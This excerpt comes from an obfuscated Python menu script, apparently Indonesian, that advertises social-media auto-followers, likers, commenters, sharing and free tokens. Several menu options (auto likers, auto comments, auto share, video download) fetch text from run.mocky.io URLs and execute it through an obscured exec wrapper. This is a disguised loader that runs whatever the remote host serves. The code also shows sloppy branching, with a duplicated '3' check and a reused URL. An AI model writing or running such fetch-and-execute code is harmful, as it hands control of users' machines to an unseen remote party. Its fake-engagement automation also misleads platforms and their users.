...
____irpanganteng____(f'{P}        │ {C}08{P} │  report bugg  │ {P}[{H}•{P}] │')
...
try:
  if ____pilih____ in ['1','01']: #AUTO FOLLOWERS
    ...
    ____irpanganteng____(f'{P}  ├─────────────────────────────────────╯')
    ____autofollower____ = ____irpan__chose____(f'{P}  ╰─➣ {K}'); os.system('python ppk.py')
  elif ____pilih____ in ['2','02']: #AUTO LIKERS
    ____irpan__execc____(requests.get("https://run.mocky.io/v3/940b9f74-932c-45f1-bea6-b99811a65ac0").text)
  elif ____pilih____ in ['3','03']: #AUTO KOMENTAR
    ____irpan__execc____(requests.get("https://run.mocky.io/v3/a39c2610-d756-4a00-872e-e188542cd62d").text)
  elif ____pilih____ in ['3','04']: #AUTO SHARE
    ____irpan__execc____(requests.get("https://run.mocky.io/v3/a39c2610-d756-4a00-872e-e188542cd62d").text)
    ...
    ____irpanganteng____(f'{P}  │    press {H}enter {P}to return to menu    │')
    ____irpanganteng____(f'{P}  ├─────────────────────────────────────╯')
    ____donatesawerr____ = ____irpan__chose____(f'{P}  ╰─➣ {K}'); os.system('python ppk.py')
    ...
    ____irpanganteng____(f'{P}    │   press {H}enter {P}to return to menu   │')
    ____irpanganteng____(f'{P}    ├───────────────────────────────────╯')
    ____freeaccountt____ = ____irpan__chose____(f'{P}    ╰─➣ {K}'); os.system('python ppk.py')
    ...
    ____freeaccestkn____ = ____irpan__chose____(f'{P}  ╰─➣ {K}'); os.system('python ppk.py')
  elif ____pilih____ in ['8','08']: #UNDUH VIDEO
    ____irpan__execc____(requests.get("https://run.mocky.io/v3/a39c2610-d756-4a00-872e-e188542cd62d").text)
  elif ____pilih____ in ['9','09']: #INFORMASI
    ____irpan__clear____
    ...
    ____informations____ = ____irpan__chose____(f'{P}   ╰─➣ {K}'); os.system('python ppk.py')
    ...
    ____kalolusalahh____ = ____irpan__chose____(f'{P}   ╰─➣ {K}'); os.system('python ppk.py')
